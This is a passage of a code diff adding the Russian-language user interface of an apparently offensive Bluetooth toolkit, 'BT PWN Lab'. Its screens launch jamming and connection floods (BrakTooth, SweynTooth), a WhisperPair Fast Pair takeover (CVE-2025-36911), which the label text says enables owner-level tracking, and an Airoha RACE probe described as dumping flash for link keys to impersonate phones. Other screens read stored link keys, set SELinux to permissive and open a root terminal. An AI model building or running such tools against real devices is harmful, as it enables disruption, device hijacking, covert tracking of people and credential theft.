+                              lambda: self.braktooth("inq"), fill_max_width=True),
+                    ui.button("Conn flood (V9 / SweynTooth LLID)",
+                              lambda: self.braktooth("conn"), fill_max_width=True),
+                ]),
+                ui.card([
+                    ui.text("Adapter", "titleLarge"),
+                    ui.button("hciconfig -a", self.show_adapter, fill_max_width=True),
+                ]),
+                ui.button("MAX JAM (усиленный)", self.open_max, fill_max_width=True),
+                ui.button("Открыть Dolphy Jammer", self.open_dolphy_jammer,
+                          fill_max_width=True),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_max(self, ui, api, state):
+        d = self.selected or {}
+        tgt = _dev_label(d) if self.selected else "— не выбрано (режим: список) —"
+        chips = [ui.chip("%s" % k, v, on_click=(lambda kk=k: self.toggle_vec(kk)))
+                 for k, v in self.vec.items()]
+        return ui.scaffold(
+            title="Jammer MAX",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("Цель", "labelLarge"),
+                    ui.text(tgt, "titleMedium"),
+                    ui.text(d.get("address") or "", "bodySmall"),
+                    ui.text(self.vec_summary(), "bodySmall"),
+                    ui.row([
+                        ui.chip("выбранное", self.target_mode == "selected",
+                                on_click=lambda: self.set_target_mode("selected")),
+                        ui.chip("весь список", self.target_mode == "list",
+                                on_click=lambda: self.set_target_mode("list")),
+                    ], spacing=6),
+                    ui.text("тулзы: %s" % (", ".join(sorted(self.tools.keys())) or "нет"),
+                            "bodySmall"),
+                ]),
+                ui.card([
+                    ui.text("Мощность", "titleLarge"),
+                    ui.slider(self.intensity, self.set_intensity, 1, 24,
+                              "RFCOMM-потоки: %d" % self.intensity),
+                    ui.slider(self.delay, self.set_delay, 0.02, 2.0,
+                              "Задержка: %.2f s" % self.delay),
+                    ui.button("СТОП MAX" if self.max_running else "СТАРТ MAX",
+                              self.jam_max_stop if self.max_running else self.jam_max_start,
+                              fill_max_width=True),
+                ]),
+                ui.card([
+                    ui.text("Векторы (тап — вкл/выкл)", "titleLarge"),
+                    ui.row(chips, spacing=6),
+                    ui.text("rfcomm=RFCOMM-цикл · sdp=пакеты RFCOMM · bond=bond spam · "
+                            "inq=inquiry cycling · gatt=GATT churn · name=btSetName · "
+                            "ble=BLE adv · root=hcitool/btmgmt · "
+                            "stack=disable/enable стека + force-stop", "bodySmall"),
+                ]),
+                ui.card([
+                    ui.text("Счётчики", "titleLarge"),
+                    ui.log_panel(self.stat_line(), 120),
+                    ui.text("stack рвёт все связи разом (радио уходит в off/on) — "
+                            "держи его отдельно, если нужен стабильный коннект.", "bodySmall"),
+                ]),
+                ui.button("Лог", self.open_log, fill_max_width=True),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_whisper(self, ui, api, state):
+        d = self.selected or {}
+        fps = [x for x in self.visible() if x.get("fp")]
+        rows = [ui.function_row(_dev_label(x),
+                                "%s · model %s" % (x.get("address"),
+                                                   x.get("fpModel") or "?"),
+                                "earbuds", on_click=self.cb_device(x)) for x in fps]
+        if not rows:
+            rows = [ui.card([
+                ui.icon("earbuds", 42),
+                ui.text("Fast Pair устройств нет в списке", "titleMedium"),
+                ui.text("Запусти скан на главном экране и включи фильтр FastPair.",
+                        "bodyMedium"),
+            ])]
+        return ui.scaffold(
+            title="WhisperPair",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("CVE-2025-36911 · Google Fast Pair", "titleLarge"),
+                    ui.text("Аксессуар не проверяет pairing mode: seeker пишет "
+                            "KBP-запрос в 0xFE2C1234, затем добивает классическим "
+                            "bond. Среднее — 10 с, дистанция до 14 м. Account key "
+                            "в 0xFE2C1236 делает тебя владельцем (трекинг Find Hub).",
+                            "bodySmall"),
+                    ui.text("Цель: %s" % (_dev_label(d) if self.selected else "—"),
+                            "titleMedium"),
+                    ui.row([
+                        ui.button("Атака WhisperPair", self.whisper_attack),
+                        ui.button("Bond spam", self.whisper_bond_spam),
+                    ], spacing=8),
+                    ui.button("Открыть встроенный WhisperPair", self.open_dolphy_whisper,
+                              fill_max_width=True),
+                ]),
+                ui.text("Fast Pair в эфире: %d" % len(fps), "titleMedium"),
+                ui.segmented_list(rows),
+                ui.card([
+                    ui.text("Ход атаки", "titleLarge"),
+                    ui.log_panel("\n".join(self.whisper_log) or "не запускалось", 200),
+                ]),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_race(self, ui, api, state):
+        d = self.selected or {}
+        return ui.scaffold(
+            title="Airoha RACE",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("CVE-2025-20700 · 20701 · 20702", "titleLarge"),
+                    ui.text("RACE: GATT 5052494d-… / dc405470-… (BLE) и RFCOMM ch21 "
+                            "(Classic). Команды: build 0x1E08, bdaddr 0x0CD5, "
+                            "ram 0x1680/0x1681. Цепочка: dump flash → link key → "
+                            "импersonation телефона.", "bodySmall"),
+                    ui.text("Цель: %s" % (_dev_label(d) if self.selected else "—"),
+                            "titleMedium"),
+                    ui.button("RACE probe", self.race_probe, fill_max_width=True),
+                ]),
+                ui.card([
+                    ui.text("Ход пробы", "titleLarge"),
+                    ui.log_panel("\n".join(self.race_log) or "не запускалось", 260),
+                ]),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    # ---------------------------------------------------------- ROOT LAB
+    def screen_lab(self, ui, api, state):
+        tl = ", ".join(sorted(self.tools.keys())) or "не найдены"
+        return ui.scaffold(
+            title="Root Lab · A13",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("BT-стек", "titleLarge"),
+                    ui.text("cmd bluetooth_manager — штатный путь для 13-го билда",
+                            "bodySmall"),
+                    ui.row([
+                        ui.button("Состояние", self.lab_bt_state),
+                        ui.button("Toggle", self.lab_bt_toggle),
+                        ui.button("Kill", self.lab_stack_kill),
+                    ], spacing=8),
+                ]),
+                ui.card([
+                    ui.text("Захват трафика", "titleLarge"),
+                    ui.text("Снуп-лог: /data/misc/bluetooth/logs/btsnoop_hci.log "
+                            "(Wireshark). Offload off = чище захват.", "bodySmall"),
+                    ui.row([
+                        ui.button("Snoop ON", self.lab_snoop_on),
+                        ui.button("Snoop OFF", self.lab_snoop_off),
+                    ], spacing=8),
+                    ui.row([
+                        ui.button("Offload off", self.lab_offload_off),
+                        ui.button("Offload on", self.lab_offload_on),
+                    ], spacing=8),
+                    ui.row([
+                        ui.button("Pull лог", self.lab_pull_snoop),
+                        ui.button("scan_always", self.lab_scan_always),
+                    ], spacing=8),
+                ]),
+                ui.card([
+                    ui.text("Свойства и MAC", "titleLarge"),
+                    ui.text("resetprop -n правит даже ro.* в обход property_service.",
+                            "bodySmall"),
+                    ui.row([
+                        ui.button("Props", self.lab_props),
+                        ui.button("BT MAC", self.lab_btmac),
+                    ], spacing=8),
+                    ui.row([
+                        ui.button("MAC random", self.lab_mac_random),
+                        ui.button("GD-стек", self.lab_gd_stack),
+                    ], spacing=8),
+                ]),
+                ui.card([
+                    ui.text("Root-обвязка", "titleLarge"),
+                    ui.text("Тулзы: %s" % tl, "bodySmall"),
+                    ui.row([
+                        ui.button("Найти тулзы", self.lab_tools),
+                        ui.button("Magisk", self.lab_magisk),
+                    ], spacing=8),
+                    ui.row([
+                        ui.button("SELinux 0", self.lab_selinux_perm),
+                        ui.button("SELinux 1", self.lab_selinux_enforce),
+                    ], spacing=8),
+                ]),
+                ui.card([
+                    ui.text("Диагностика", "titleLarge"),
+                    ui.row([
+                        ui.button("dumpsys", self.lab_dumpsys),
+                        ui.button("logcat BT", self.lab_logcat),
+                    ], spacing=8),
+                    ui.button("Имена", self.lab_names, fill_max_width=True),
+                ]),
+                ui.card([
+                    ui.text("Вывод", "titleLarge"),
+                    ui.log_panel("\n".join(self.lab_log[-160:]) or "пусто", 300),
+                ]),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    # ------------------------------------------------- v4.3: экран имён
+    def screen_names(self, ui, api, state):
+        named = [d for d in self.visible() if _pick_name(d)]
+        rows = [ui.function_row(_dev_label(x),
+                                "%s · %s" % (x.get("address"), x.get("vendor") or "?"),
+                                "badge", on_click=self.cb_device(x)) for x in named]
+        if not rows:
+            rows = [ui.card([
+                ui.icon("badge", 42),
+                ui.text("Имён пока нет", "titleMedium"),
+                ui.text("Имя появляется, если устройство его вещает, если оно есть "
+                        "в спаренных, или после «Прочитать имя» на карточке.",
+                        "bodyMedium"),
+            ])]
+        return ui.scaffold(
+            title="Имена",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text("Известных имён: %d" % len(self.known_names), "titleMedium"),
+                    ui.text("Спаренные и bt_config.conf подтягиваются автоматически.",
+                            "bodySmall"),
+                    ui.button("Обновить список", self._refresh_known_names,
+                              fill_max_width=True),
+                ]),
+                ui.text("С именем: %d" % len(named), "titleMedium"),
+                ui.segmented_list(rows),
+                ui.card([
+                    ui.text("Как получили имя", "titleLarge"),
+                    ui.log_panel("\n".join(self.name_log[-60:]) or "пусто", 200),
+                ]),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def show_adapter(self):
+        self.log("--- hciconfig ---")
+        for line in _sh("%s -a" % _tool("hciconfig")).splitlines()[:40]:
+            self.log(line)
+        self.navigate("log")
+
+    def screen_keys(self, ui, api, state):
+        rows = [ui.settings_row(r["name"], "%s · %s" % (r["mac"], r["key"][:24]), "vpn_key")
+                for r in self.keys_rows]
+        if not rows:
+            rows = [ui.settings_row("Нет данных", "нажми «Читать»", "info")]
+        return ui.scaffold(
+            title="Link Keys",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.button("Читать bt_config.conf", self.load_keys, fill_max_width=True),
+                ui.text("%d записей" % len(self.keys_rows), "titleMedium"),
+                ui.segmented_list(rows),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_term(self, ui, api, state):
+        quicks = [ui.button(label, (lambda c=cmd: self.term_quick(c)))
+                  for label, cmd in self.QUICK]
+        return ui.scaffold(
+            title="Root Terminal",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.card([
+                    ui.text_field(self.term_cmd, self.term_set, "команда"),
+                    ui.row([
+                        ui.chip("root" if self.term_root else "shell",
+                                self.term_root,
+                                on_click=lambda: self.term_mode(
+                                    "shell" if self.term_root else "root")),
+                        ui.text("root: %s" % self.root_ok, "bodySmall"),
+                    ], spacing=8),
+                    ui.row([
+                        ui.button("Выполнить", self.term_run),
+                        ui.button("Очистить", self.term_clear),
+                    ], spacing=8),
+                ]),
+                ui.card([
+                    ui.text("Быстрые", "titleLarge"),
+                    ui.row(quicks, spacing=6),
+                ]),
+                ui.log_panel("\n".join(self.term_lines[-300:]) or "пусто", 380),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    def screen_log(self, ui, api, state):
+        return ui.scaffold(
+            title="Лог",
+            content=ui.lazy_column([
+                ui.row([ui.icon_button("arrow_back", self.back)], spacing=8),
+                ui.log_panel("\n".join(self.log_lines[-200:]) or "пусто", 420),
+            ], padding=16, spacing=12, fill_max_size=True),
+        )
+
+    # ============================================ HOOК-ПАНЕЛИ
+    def screen_whisper_panel(self, ui, api, state):
+        d = self.selected or {}
+        return ui.card([
+            ui.row([
+                ui.icon("earbuds", 30),
+                ui.column([
+                    ui.text("BT PWN Lab · WhisperPair", "titleMedium"),
+                    ui.text("CVE-2025-36911 · цель: %s"
+                            % (_dev_label(d) if self.selected else "—"), "bodySmall"),
+                ], spacing=2),
+            ], spacing=10),
+            ui.row([
+                ui.button("Атака", self.whisper_attack),
+                ui.button("Bond spam", self.whisper_bond_spam),
+                ui.icon_button("terminal", self.open_term),
+            ], spacing=8),
+        ])
+
+    def screen_jam_fab(self, ui, api, state):
+        return ui.icon_button("bolt", self.open_max)
